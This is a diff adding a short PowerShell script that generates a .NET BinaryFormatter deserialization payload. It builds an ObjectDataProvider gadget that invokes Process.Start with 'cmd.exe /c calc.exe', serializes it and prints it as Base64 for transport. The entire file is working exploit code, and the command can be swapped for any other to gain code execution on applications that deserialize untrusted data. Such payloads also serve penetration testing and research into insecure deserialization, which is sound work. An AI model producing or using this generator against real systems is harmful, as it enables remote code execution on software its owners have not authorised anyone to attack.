@@ -1,0 +1,33 @@
+# --- PowerShell Payload Generator for .NET BinaryFormatter ---
+
+# 1. Load the necessary assembly for ObjectDataProvider
+Add-Type -AssemblyName PresentationFramework
+
+# 2. Create the ObjectDataProvider instance (the "gadget")
+$odp = New-Object System.Windows.Data.ObjectDataProvider
+
+# 3. Configure the gadget to execute a command
+#    - The ObjectInstance is a Process object.
+#    - The MethodName "Start" will be called on that Process object.
+#    - MethodParameters are the arguments for Process.Start (the executable and its arguments).
+$odp.ObjectInstance = New-Object System.Diagnostics.Process
+$odp.MethodName = "Start"
+$odp.MethodParameters = @("cmd.exe", "/c calc.exe")
+
+# 4. Serialize the gadget using BinaryFormatter
+$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$memStream = New-Object System.IO.MemoryStream
+
+# Serialize the object graph into the memory stream
+$formatter.Serialize($memStream, $odp)
+
+# 5. Convert the serialized bytes to a Base64 string for easy transport
+$bytes = $memStream.ToArray()
+$base64Payload = [System.Convert]::ToBase64String($bytes)
+
+# 6. Output the payload
+Write-Host "Base64 Payload:"
+Write-Host $base64Payload
+
+# Clean up
+$memStream.Dispose()
